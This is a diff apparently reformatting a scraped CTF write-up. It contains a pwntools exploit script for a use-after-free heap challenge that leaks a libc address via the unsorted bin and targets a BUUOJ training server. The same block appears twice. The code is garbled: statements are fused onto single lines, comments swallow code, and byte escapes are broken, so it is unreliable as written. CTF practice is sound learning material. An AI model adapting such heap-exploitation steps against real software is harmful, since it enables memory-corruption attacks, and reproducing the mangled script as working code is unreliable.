@@ -3,13 +3,15 @@
 > 原文: https://www.ctfiot.com/89346.html
 > ID: 89346
 
-Pythonfrom pwn import *import pdb# -*- coding: utf-8 -*- 
+Python
+from pwn import *import pdb
+# -*- coding: utf-8 -*-
 
 debug = 1if (debug): p = process("./uaf_pwn")else: p = remote('node4.buuoj.cn', 25403)
 
 libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
 
-def malloc(size): p.recvuntil(">") p.sendline("1") p.recvuntil("size>") p.sendline(str(size)) 
+def malloc(size): p.recvuntil(">") p.sendline("1") p.recvuntil("size>") p.sendline(str(size))
 
 def free(idx): # p.recvuntil(">") p.sendline("2") p.recvuntil("index>") p.sendline(str(idx))
 
@@ -17,7 +19,8 @@ def fill(idx,payload): p.recvuntil(">") p.sendline("3") p.recvuntil("index>") p.
 
 def show(idx): p.recvuntil(">") p.sendline("4") p.recvuntil("index>") p.sendline(str(idx)) return p.recv()[:-1]
 
-malloc(0x100) # idx 0 use unsorted_bin get main_arena offsetmalloc(0x60) # idx 1free(0)leakaddr = show(0)# leak <main_arena + 88>libc_base = u64(leakaddr+b'x00'+b'x00') - 0x3c4b78
+malloc(0x100) # idx 0 use unsorted_bin get main_arena offsetmalloc(0x60) # idx 1free(0)leakaddr = show(0)
+# leak <main_arena + 88>libc_base = u64(leakaddr+b'x00'+b'x00') - 0x3c4b78
 
 print(hex(libc_base))
 
@@ -31,13 +34,15 @@ p.interactive()
 
 
 ```
-Pythonfrom pwn import *import pdb# -*- coding: utf-8 -*- 
+Python
+from pwn import *import pdb
+# -*- coding: utf-8 -*-
 
 debug = 1if (debug): p = process("./uaf_pwn")else: p = remote('node4.buuoj.cn', 25403)
 
 libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
 
-def malloc(size): p.recvuntil(">") p.sendline("1") p.recvuntil("size>") p.sendline(str(size)) 
+def malloc(size): p.recvuntil(">") p.sendline("1") p.recvuntil("size>") p.sendline(str(size))
 
 def free(idx): # p.recvuntil(">") p.sendline("2") p.recvuntil("index>") p.sendline(str(idx))
 
@@ -45,7 +50,8 @@ def fill(idx,payload): p.recvuntil(">") p.sendline("3") p.recvuntil("index>") p.
 
 def show(idx): p.recvuntil(">") p.sendline("4") p.recvuntil("index>") p.sendline(str(idx)) return p.recv()[:-1]
 
-malloc(0x100) # idx 0 use unsorted_bin get main_arena offsetmalloc(0x60) # idx 1free(0)leakaddr = show(0)# leak <main_arena + 88>libc_base = u64(leakaddr+b'x00'+b'x00') - 0x3c4b78
+malloc(0x100) # idx 0 use unsorted_bin get main_arena offsetmalloc(0x60) # idx 1free(0)leakaddr = show(0)
+# leak <main_arena + 88>libc_base = u64(leakaddr+b'x00'+b'x00') - 0x3c4b78
 
 print(hex(libc_base))
 
